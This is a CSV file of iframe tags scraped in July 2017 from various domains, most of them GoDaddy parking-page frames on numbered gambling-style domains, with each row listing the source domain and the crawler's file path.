Index,Iframe,domain,filename
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj82.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4556_20170727_174458/html_200_20170727_174458.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj64.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1812_20170727_174428/html_200_20170727_174428.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH1AGHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj5555.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1631_20170727_174419/html_200_20170727_174419.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwMjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50026cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3124_20170727_171828/html_200_20170727_171828.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwIjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50025cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_248_20170727_171827/html_200_20170727_171827.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj22.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_882_20170727_174316/html_200_20170727_174316.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj38.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4810_20170727_174348/html_200_20170727_174348.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZmZl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj333.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4091_20170727_174341/html_200_20170727_174341.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3AmphpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj7777.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4314_20170727_174453/html_200_20170727_174453.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlZwVhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj2222.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_268_20170727_174317/html_200_20170727_174317.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj76.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8618_20170727_174451/html_200_20170727_174451.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj77.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1837_20170727_174452/html_200_20170727_174452.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRlZl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj123.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3599_20170727_174305/html_200_20170727_174305.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj54.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_841_20170727_174410/html_200_20170727_174410.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj10.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_745_20170727_174300/html_200_20170727_174300.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmMjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50036cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9300_20170727_171836/html_200_20170727_171836.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx5BF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj999.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2323_20170727_174544/html_200_20170727_174544.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmqjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50037cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2488_20170727_171837/html_200_20170727_171837.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj13.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1369_20170727_174306/html_200_20170727_174306.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD0AQDhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj4444.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1330_20170727_174357/html_200_20170727_174357.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmyjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50039cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9518_20170727_171839/html_200_20170727_171839.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj79.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3926_20170727_174455/html_200_20170727_174455.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj17.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1323_20170727_174312/html_200_20170727_174312.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://934082.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6296_20170727_172839/html_200_20170727_172839.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmIjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50035cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7386_20170727_171835/html_200_20170727_171835.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj67.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4755_20170727_174443/html_200_20170727_174443.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj49.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2601_20170727_174404/html_200_20170727_174404.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj16.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3111_20170727_174311/html_200_20170727_174311.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj51.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_50_20170727_174407/html_200_20170727_174407.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj75.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2037_20170727_174450/html_200_20170727_174450.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj78.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2219_20170727_174454/html_200_20170727_174454.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj59.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_774_20170727_174424/html_200_20170727_174424.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj52.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3540_20170727_174408/html_200_20170727_174408.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj24.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2404_20170727_174319/html_200_20170727_174319.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZmOjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50030cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8065_20170727_171832/html_200_20170727_171832.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRkZGRhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj1111.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9161_20170727_174303/html_200_20170727_174303.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qTIhLKSwoz1hozHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://grandpazaar.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7863_20170726_190123/html_200_20170726_190123.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/MzqvMJjgrUMaMv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://story-kits.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_5924_20170726_182323/html_200_20170726_182323.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pzMlp2qlpUHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",https://eseftech.com/,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_4718_20170726_185433/html_200_20170726_185433.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/L25yqz51M3IlrzWcqaVhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://pariahthemovie.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_4448_20170726_192544/html_200_20170726_192544.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pUIyqzMaLzMyLzSaLzLhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://christosrontos.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2557_20170726_180004/html_200_20170726_180004.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzkzL3Wjqz55qz0hpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myspecializ.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1975_20170726_192142/html_200_20170726_192142.txt
0,"<iframe frameborder=""0"" height=""100%"" marginwidth=""0"" scrolling=""auto"" src=""http://fwdssp.com/?dn=referer_detect&amp;pid=5POL4F2O4"" width=""100%""></iframe>",http://babybabilo.com/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2559_20170726_183856/html_200_20170726_183856.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/ozW5MaWupF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://aolsend.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9758_20170726_175641/html_200_20170726_175641.txt
0,"<iframe height=""100%"" src=""https://www.nuxhotel.biz"" width=""100%""><a href=""https://www.nuxhotel.biz"">https://www.nuxhotel.biz</a></iframe>",http://habgo.biz,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1818_20170726_190205/html_200_20170726_190205.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qUWaMzAlpUMhrKMgYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://getspecializ.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7638_20170726_185959/html_200_20170726_185959.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/oay5pzMwLzIaMv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://allesports.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9633_20170726_183435/html_200_20170726_183435.txt
0,"<iframe frameborder=""0"" height=""600"" scrolling=""no"" src=""https://soundgine.com/@ibsenproducer/euplayer/pod/mobile/index.php?id=2"" style=""border:none"" width=""100%""></iframe>",https://liisvoice.com/,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9242_20170726_191520/html_200_20170726_191520.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/naWiM3WzM3MjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://webtestic.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3790_20170726_182805/html_200_20170726_182805.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzklrKSlMJ5knKMgLzHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myelderadvizor.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3765_20170726_192111/html_200_20170726_192111.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzI2qUEzYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://mriggs.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_549_20170726_192027/html_200_20170726_192027.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/LKIhLJglMl52LKAv"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://nhanxet.info,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_6688_20170726_192307/html_200_20170726_192307.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pT5zoaShMzAyqachMv5upzp="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://casadasprimas.net,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1744_20170726_175925/html_200_20170726_175925.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qUWapaykpzIhpJy2MzWyYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://getelderadvisor.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_6209_20170726_185957/html_200_20170726_185957.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzklrKSlMJManUAmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myelderstuff.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8613_20170726_192111/html_200_20170726_192111.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rTWvo3OvLJqyLaxhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://koobcontrol.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2351_20170726_191358/html_200_20170726_191358.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/LzSaraMupzHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://ontminer.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8960_20170726_181706/html_200_20170726_181706.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pJ52rJkkpzI6qzLhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://dailydermis.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_696_20170726_184842/html_200_20170726_184842.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qTWhM2M2M3VhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://goatsite.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7918_20170726_190044/html_200_20170726_190044.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/o2W2M3WzozSapv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://boitesante.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8888_20170726_184227/html_200_20170726_184227.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/MJWzpTWlL3IfMaMvYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://roscoephysio.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3065_20170726_182100/html_200_20170726_182100.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://evro-partner.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1347_20170729_083745/html_200_20170729_083745.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://krpa.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7522_20170729_033627/html_200_20170729_033627.txt
